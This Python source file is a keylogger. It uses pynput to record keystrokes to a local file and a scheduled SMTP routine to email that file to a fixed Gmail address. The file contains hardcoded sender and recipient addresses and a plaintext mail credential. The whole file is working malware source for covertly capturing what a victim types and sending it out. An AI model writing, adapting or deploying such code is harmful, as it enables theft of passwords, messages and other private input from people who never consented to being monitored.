import smtplib
import time
import schedule
from pynput import keyboard  # logger
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders

def keyPressed(key):
    print(str(key))
    with open("keyfile.txt", 'a') as logKey:
        try:
            char = key.char
            logKey.write(char)
        except:
            print("Error getting char")


if __name__ == "__main__":
    listener = keyboard.Listener(on_press=keyPressed)
    listener.start()
    input()

fromaddr = "muneawr@gmail.com"
toaddr = "munawarp.pa@gmail.com"

def mail():
    msg = MIMEMultipart()
    msg['From'] = fromaddr
    msg['To'] = toaddr
    msg['Subject'] = "Keylogger:"
    body = "KeyLogger"

    msg.attach(MIMEText(body, 'plain'))
    filename1 = "keyfile.txt"
    attachment1 = open("keyfile.txt", "rb")
    p = MIMEBase('application', 'octet-stream')
    p.set_payload((attachment1).read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename1)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromaddr, "utoiaduiuotrprfn")
    text = msg.as_string()
    s.sendmail(fromaddr, toaddr, text)
    s.quit()

schedule.every(1).seconds.do(mail)


while True:
    schedule.run_pending()
    time.sleep(5)
